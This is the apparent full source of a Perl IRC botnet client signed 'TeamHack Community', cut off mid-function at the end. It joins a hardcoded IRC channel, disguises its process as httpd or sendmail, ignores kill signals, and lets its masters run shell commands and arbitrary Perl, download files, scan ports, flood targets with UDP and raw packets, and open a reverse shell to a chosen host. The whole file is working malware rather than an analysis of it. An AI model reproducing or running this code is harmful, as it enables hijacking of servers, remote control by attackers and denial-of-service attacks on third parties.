#!/usr/bin/perl
#
# TeamHack Community
#
my @mast3rs = ("CaMaChO");


my @admchan=("#teamhack");

$servidor='angel.byroe.net' unless $servidor;


my $xeqt = "!x";
my $homedir = "/tmp";
my $shellaccess = 1;
my $xstats = 1;
my $pacotes = 1;
my $linas_max = 5;
my $sleep = 6;
my $portime = 4;

my @fakeps = ("/usr/local/apache/bin/httpd -DSSL","xinetd -stayalive -pidfile /usr/local/mysql"
   "/usr/sbin/httpd -k start -DSSL","/usr/sbin/httpd","/usr/sbin/sendmail",
   "spamd child",
   "httpd");

my @nickname = ("Ce_kampus","Ce-PanGGilan","ayam^Betina","memex^Basah","Ce-Rasax^Legit","Bunga^Desa","Bunga-Sekolah","kohona",
   "Kembang^Kampus","Kembang-desa","kembang^Setaman","Bunga-Teratai","Cewe-bahenol","yuanita","sukmasari","nadya","neneng",
   "Octavia","ivanya","borjouis","selamet","co^alim","ce_semlohe","co^anune-gede","co_suka69","ce-hyper","ce_martubation",
   "Ce_Mauaja","Hokage","pokemon","SouraBot","Soura_SaYank","PunK_rock","Majas","Sameti","V3g3t4R1aN","Ce^ImutaN","b4dB0ys",
   "JhemBaT","NaZaRETHs","White^Lions","BSDunixz","xHUNTERx","SamKok","Scroll^Lock","Tom_Cruise","Cewek^Gatal","Cewek_G4lak",
   "JombloGirl","Gadis_Ituan","PAMFLeT","Cewek_Nantangin","coWok^Anunya^Gede","CoWok_Pemalu14","Harrys25","Boneto","sleepAway",
   "NumLock","sarah20","momomia","alienz23","cewek^hyper24","cowok^Keren","r00t3r","r3dh4t","g3nt00","s4mb4","m4sspl0","indri",
   "Duda^Anak1","yu4nita","r0ck3r","janda-kembang","janda-genit","janda^Jablay","Janda^Alay","Janda-Eceran","Ita-Muaniez","ririen",
   "kitty-cantik","hartati","hestie","sc0rp10ns","ce_doyan","ce_Ndut","Ce_Langsing","cowo-Kampus","Cowo-perkasa","cowo-gede^Buanget",
   "Cewe^Aquarius","Cewe^Gemini","Cewe^taurus","Cewe^Capricorn","Cewe^Leo","Cewe^FreeLand","Helina","Nuraini","Nuning","Karmila",
   "Cowo^Kerja-Pabrikan","cowo^Romantisme","cowo^Seksi","Cowo^ok-Buanget","cowo-kuat24jam","Tokek^Belang","Keong^Racun","Tokek-Racun",
   "AbankSayang","AsMaraCinta","ADmonZ","AshemZ","ArMoNe","AstuTie","ArManMuaLagi","AsHiteNoYuKi","AsTi`LuMut","Alda^Cakhep","AldaRiNa",
   "AdheLin","AndreAz","AgroLoG","ASMatarz","Angklugs","Asmiati","Amaludin","AiniMul","Aachserem","AmsterMoLd","ArSmoDels","ANgeL`T`Lork",
   "AnDho`Ra","AndaIkuTahu","AndrianiKu","ANdrakuLi","Ansri^Cute","AntonLUCU","AntaraAkudanDia","ArdanCubby","ArniCakep","AranKal","ArisTeleke", 
   "Armoniculun","ArANSayNo","AtakuCaruni","AuSiBadeMu","AureMaPende","Axeslrod","AKuSayangKamu","AnDigusAe","AyKosHUki","Aylinklung","AziBishi",
   "BaKLucipok","BackToLaptop","BaBonNakal","BaNdoCewek","BagoLSadis","BairlahKuPergi","BakauHuNi","BalaJar`Nich","BallonBiru","BalCoklat","BalCeMara",
   "Bantal`ngePink","BaraApiCinta","BaraNgKali","BarangCuriaN","BaranKEceran","BarBarLuCu","BarbelaTi","Barnekat","BarnOrak","BarrAngkaliKu","Barr4KUla",
   "BartaToMuda","BartoTongan","Bartomboyneh","BasavAyach","BasheVip","BatchFiles","BaumiNuman","BayGone","BayoCie","Beaconek","Bealboleh","BeanJelek",
   "BeckBones","Bed2untukmu","BedforKamusay","Beha36c","BelangCowok","Bela_Jar_ngeCok","BeLMuarah","BelidaCakep","BellaMuanis","BellHouseEnak","BellIkanKucinta",
   "BellokKananTrusTerjun","Benedis-cute","Bergosong","Berke-keKele","Bernardcupu","Bernasabonar","Bersamalagi","Berrikankucintha","BettiLaveani","BeyCintakuini",
   "Biagiandalam","BicelBoneng","BiniIdaman","Bir-dan-anggur","BisMalam-minggu","BishaAjadeh","Black-Claw","Black-Cutes","BlagiaPatahHati","BlakoLakoke","Blankpages",
   "BliSaMuanis","BliardTukangUtang","BlooNNih","BloemBerKasa","BloSariKucing","Blox34Mbakar","BlyBongBokong","BolGegerOtak","BoKannyaCinta","BolaCinta","BolongCelanaku",
   "BonDuluyach","BonaKe","BonitakuCakep","BondanDonk","BoKanHanyakamu","Bookataue-book","Boongkan","BoorTanah","Borcakdarah","Bordenhitan","BosLagiapaneh","BotLamaBanget",
   "BotoLDoDolz","BouKamutuh","BouCakepdeh","Bourdengaku","BoweLCutez","BoxerCiPoK","BoyaLiLiCUt","BoyeNgLoloS","BoyCakep","BoyMacammacam","BoYang","Brayeswah","Bra36c",
   "Brapik-apik","BrengCarako","BreediMahal","Brenang-di-laut","BrendamDiPantai","BrewbrowSosok","Brewlakon","BridgeCakep","Bridganas","BrinTendang","BritisSpirtus","BroKoKok",
   "BrooNonton","Brzykarte","BuchaMacan","Buddikucing","Buldarisma","BuTuti","Budarmansyah","Bubursapi","BurketLoh","BurahMurah","BusetLahLoh","Byabuyar","ByelahOke","ByBoyCakep",
   "CageModel","CalmeCute","CameSiniDonksay","CamKuinirusak","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo","Carayannopoulos","Carlin",
   "Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Castelda","Cavanagh","Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky", 
   "Chiassino", "Chien","Childress","Childs","Chinipardaz","Chinman","Christenson","Christian","Christiano","Christie","Christopher","ChuPuZ","Chupasko","Church","Ciampaglia","Cicero", 
   "Cifarelli","Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton","Comstock","Concino","Condodina","Connors",
   "Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen","Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli",
   "Dante","Dapice","D'arcangelo","Das","Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon","Delger",
    "Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio","Difronzo","Dilworth","Dionysius","Dirksen");

my @xident = ("noway","mirc","cmd","index","main","php","vuln","iiris","bx","sun","khan",
   "remax","rik","fatig","poor","girls","pow","wop","wok","son","kolsa","royk","asss",
   "los","las","angl","dream","fools","phol","phools","d0rk","spon","spalk","kalk",
   "email","smtp","pops","imapd","pag","lang","lg","nav","php","spyer","cyp","hardy",
   "dara","dora","boris","dev","cupra","isgal","Yuri","Geez","Frys","dos","to","emul",
   "shv5","lrk","lkm","lkmrk","trk5","xt","tqex","itt","full","half","power","sender",
   "does","tres","quat","fiat","spon","kvae","liim","papp","ddos","fart","noz","daim",
   "liga","tvone","shdw","etcpwd","initd","ftpd","wuspl","proftp","newsd","sockd","lue",
   "koma","loc","inc","incl","src","fokus","ford","chevy","wrc","cpu","cool","srchers",
   "pico","nmap","juge","sone","log","goofy","kars","meter","daim","kul","foksy","hyena",
   "beta","pulse","driver","org","fos","kars","kma","fua","all","tea","foks","lady","fa",
   "testo","bola","bolen","card","cards","chip","chips","wv","audi","bmw","roys","bechs",
   "nokia","mrx","some","candy","goo","cool","scam","scan","google","lee","cam","li","dm",
   "owner","crime","data","need","doper","hash","mysql","imapd","devil","shark","byn","ju");

my @xname = ("4[[6TeamHacK 8LaBoRaToRiuMz12]]",
   "Cinta lawan Selingkuh","SeRinG PuTus Cinta","Mr. Mudah Jatuh Cinta","Punk ICU",
   "R0ck and Rool","Ketika Rasa Tak Dapat Diungkap","Percuma Kita Bersama DinDa","Manusia Bodoh",
   "Coli sambil nonton film biru","Lihat Cewek2 Pake tanktop","Power of Keindahan","TigaBelas DelapanTujuh",
   "Menyelam Sambil Minum Es Krim","LaGi Chat Ama Cewek Gw","Apa Lho Lihat-lihat","Gw Emang Ganteng", 
   "Dari Mata Turun Kehati","Saya Bukan Siapa-siapa","Ketika cinta penuh dengan makna","Jangan Tanya AKu ini siapa?",
   "Samada Aka Sia sanai-nai","Cou nggara Mu Cinae","Gaya EnamSembilan","Kamu LIhat Apa, Kangen Yach","Cinta, Damai dan Sex?", 
   "Founder Rumah Sakit Jiwa","Selamat Jalan Sayang","SaMaDa Sampe made","Tiada Hari Tanpa Sebuah Mimpi","Aku Benci Semua Yang Tak Pasti",
   "Suka Sama Aku Yach","Whois Lagi Donk say..","Samada aka Nggomike","Yang Whois Orang Gila","Random Is OFF","n0b0d1 p3tt1n9 w1th m3",
   "AKu Adalah Aku, KAmu siapa","DouMaLinGi","Ashem bin pahit","Lihat Aku Yang Cakep Khan","ISabela Adalah Kisah","LA Hami Di La Hima",
   "Sampela Lao La Sampula","Marewo ro marawa","Manangi ro masamangi","Na SampeLuku","Power Of Kerinduan","On The Fly apa yach","Founder Henca",
   "Jalan Cinta Kita","Jalan Siapa Ini","Allah Hu Akbar","Im your god idiot","Chat Sambil Baca Komik Hentai","Manga Hentai","Intan Dan Berlian",
   "Putri Kesepian","Keep it to yourself!","Kemana Aku harus pergi","WhiresLoves","Kekuatan Cinta dan Sayang","Aku cinta padamu","Cinta Kau dimana?",
   "Aku Disini cinta!","LInux atau windows","Maria Carrey","Mencari cinta","Hantu Genit","Cowok Cupu","Cewek genit","Kekuatan Dalam Keindahan","Ama Uma",
   "Gunung Dua Di Raba","Ompu Hima","VsMode Di Rasa","Scan Mode On","Set Mode Diam","Cinta tak dapat di ungkap dengan kata","Dia adalah Cewekku");

#################
# Random Ports
#################
my @rports = ("6667");

my @Mrx = ("4,1�0,1K�||�F�nt�y4,1�",
   "1,4 1,16 0,1 Atfv4.00x-[GamA] 1,4 14,16 ",
   "1,15�0,1�1,15-�-&--[WaRS���� ]--&-�-0,1�1,15�",
   "1,15[0]1,14\15/4G�H��t-41/15\1,15[0]",
   "0,14CuLeK MuaTaMu KwaPok KoeN...!!!");

# Default quick scan ports
my @portas=("21","22","23","25","53","80","110","113","143","3306","4000","5900","6667","6668","6669","7000","10000","12345","31337","65501");

# xeQt

#my $nick = "TeaMHacK";
my $nick = $nickname[rand scalar @nickname];
my $realname = $xname[rand scalar @xname];
my $ircname = $xident[rand scalar @xident];
my $porta = $rports[rand scalar @rports];
my $xproc = $fakeps[rand scalar @fakeps];
my $Mrx = $Mrx[rand scalar @Mrx];
my $version = '4[[6TeamHacK 4Bot14-4PHP 8LaBoRaToRiuMz12]]';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("$homedir");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$xproc"."\0";
my $pid=fork;
exit if $pid;
die "[x] -> Cannot fork into background: $!" unless defined($pid);
my %irc_servers;
my %DCC;
my $dcc_sel = new IO::Select->new();

sub getnick {
  return "$nickname[rand scalar @nickname]".int(rand(03));
}

sub getstore ($$)
{
  my $url = shift;
  my $file = shift;

  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}
sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}
sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  #print "HOST=$host, PORT=$port, PATH=$path\n";

  $AGENT = "get-minimal";
  $VERSION = "20000118";

  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto   => 'tcp', Timeout  => 60) || return;

  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;
  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") {
      $b1 = $buf;
      $buf =~ s/.+?\015?\012\015?\012//s;
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);
  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    # print "CODE=$main::http_get_result\n$b1\n";
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/) {
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }
  return $buf;
}
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}
sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];
   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;
     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);
     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 2;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   &DCC::connections;
   my @ready = $sel_cliente->can_read(0.6);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);
     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostnam3=$3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "".$Mrx."");
       }
       elsif ($args =~ /^\001PING\s+(\d+)\001$/) {
         notice("$pn", "\001PONG\001");
       }
       elsif (grep {$_ =~ /^(\Q$pn\E|\Q$hostnam3\E)$/i } @mast3rs) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
        }
    if ($args =~ /^!(.*)/){
       ircase("$pn","$chan","$1");
    }
        if ($args =~ /^(\Q$meunick\E|\Q$xeqt\E)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1");
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         }
       }
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       $meunick = getnick();
       nick("".$meunick."-");
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@admchan){
         sendraw("JOIN $canal 206xss");
       }
   }
}
sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork)
       {
         exit;
       }
   else
   {
      # Quick scan
           if ($funcarg =~ /^ps (.*)/) {
             my $hostip="$1";
        sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312Portscanning\003\002: $1 \002\00312Ports:\003\002 default");
             my (@aberta, %porta_banner);
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
         sendraw($IRC_cur_socket, "PRIVMSG $printl :Found: $porta"."/Open");
                }
             }
             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Port Scan Complete with target: $1 ");
             } else {
                 sendraw($IRC_cur_socket,"PRIVMSG $printl :\002[x]\0034 No open ports found on\002 $1");
             }
           }
      # NMAP, lol
           elsif ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/)
      {
              my $hostname="$1";
              my $portstart = "$2";
               my $portend = "$3";
               my (@abertas, %porta_banner);
          sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312xMap Portscanning\003\002: $1 \002\00312Ports:\003\002 $2-$3");
               foreach my $porta ($portstart..$portend)
             {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
               if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats)
       {
                   sendraw($IRC_cur_socket, "PRIVMSG $printl :Found: $porta"."/Open");
                 }
               }
             }
             if (@abertas) {
          sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312Scan Complate\003\002");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :\002\00312No ports found..\002");
             }
            }
      # Remove
      elsif ($funcarg =~ /^rm/)
      {
         system("cd /var/tmp ; rm -rf .mrx ; rm -rf alex.txt ; rm -rf alex.txt.* vx* mrx*");
      system("cd /tmp ; rm -rf .mrx ; rm -rf alex.txt ; rm -rf alex.* ; mkdir /tmp/.mrx ; cd /tmp/.mrx");
      sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(Quickdel)\002\00314 Removed files and folders ");
      }
      # Version
      elsif ($funcarg =~ /^version/)
      {
         sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(Version)\002\00314 $version ");
      }
      # Download
           elsif ($funcarg =~ /^down\s+(.*)\s+(.*)/)
      {
              getstore("$1", "$2");
              sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(Download)\002\00314 Page: $2 (File: $1)") if ($xstats);
           }
       # Udp
            elsif ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $alvo=inet_aton("$1");
              my $porta = "$2";
              my $tempo = "$3";
              my $pacote;
              my $pacotese;
              my $fim = time + $tempo;
              my $pacota = 1;
         sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(UDP DDoSing)\003 Attacking\002: $1 - \002Time\002: $tempo"."seconds");
              while (($pacota == "1") && ($pacotes == "1")) {
                $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
                $pacote=$rand x $rand x $rand;
                $porta = int(rand 65000) +1 if ($porta == "0");
                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
              }
              if ($xstats)
              {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(UDP Complete):\003\002 $1 - \002Sendt\002: $pacotese"."kb - \002Time\002: $tempo"."seconds");
             }
            }

       # Backconnect
            elsif ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
              my $host = "$1";
              my $porta = "$2";
              my $proto = getprotobyname('tcp');
              my $iaddr = inet_aton($host);
              my $paddr = sockaddr_in($porta, $iaddr);
              my $shell = "/bin/sh -i";
              if ($^O eq "MSWin32") {
                $shell = "cmd.exe";
              }
              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
              connect(SOCKET, $paddr) or die "connect: $!";
         sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[x] ->\0034 Injection ...");
              open(STDIN, ">&SOCKET");
              open(STDOUT, ">&SOCKET");
              open(STDERR, ">&SOCKET");
              system("$shell");
         system("cd /tmp/.mrx");
              close(STDIN);
              close(STDOUT);
              close(STDERR);
            }
           exit;
       }
  }
}

sub ircase {
  my ($kem, $printl, $case) = @_;

   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl", "$kem") if $case eq "voice";
      $oarg = substr($case, 6);
      voice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl", "$kem") if $case eq "devoice";
      $oarg = substr($case, 8);
      devoice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^jump\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   elsif ($case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND("$1", "$2");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
   elsif ($case =~ /^rj\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^rp\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^quit/) {
     quit();
   }
   elsif ($case =~ /^rand/) {
    my $novonick = getnick();
     nick("$novonick");
   }
   elsif ($case =~ /^stat (.*)/) {
     if ($1 eq "on") {
      $xstats = 1;
      msg("$printl", "Status enabled");
     } elsif ($1 eq "off") {
      $xstats = 0;
      msg("$printl", "Status disable");
     }
   }
   elsif ($case =~ /^bang (.*)/) {
     if ($1 eq "on") {
      $pacotes = 1;
      msg("$printl", "[x] Bang mode enabled") if ($xstats == "1");
     } elsif ($1 eq "off") {
      $pacotes = 0;
      msg("$printl", "[x] Bang mode disabled") if ($xstats == "1");
     }
   }
}
sub shell {
  return unless $shellaccess;
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "cd: $1".": No such file or directory");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c >= "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

sub attacker {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'B' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65535; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);
       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

sub action {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001ACTION $_[1]\001");
}
sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub hop {
    return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub dehop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub ban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +b $_[1]");
}
sub unban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -b $_[1]");
}
sub kick {
   return unless $#_ == 1;
   sendraw("KICK $_[0] $_[1] :$_[2]");
}
sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}
sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }
sub whois {
  return unless $#_ == 0;
  sendraw("WHOIS $_[0]");
}
sub who {
  return unless $#_ == 0;
  sendraw("WHO $_[0]");
}
sub names {
  return unless $#_ == 0;
  sendraw("NAMES $_[0]");
}
sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}

package DCC;
sub connections {
   my @ready = $dcc_sel->can_read(1);
#   return unless (@ready);
   foreach my $fh (@ready) {
     my $dcctipo = $DCC{$fh}{tipo};
     my $arquivo = $DCC{$fh}{arquivo};
     my $bytes = $DCC{$fh}{bytes};
     my $cur_byte = $DCC{$fh}{curbyte};
     my $nick = $DCC{$fh}{nick};
     my $msg;
     my $nread = sysread($fh, $msg, 10240);
     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {
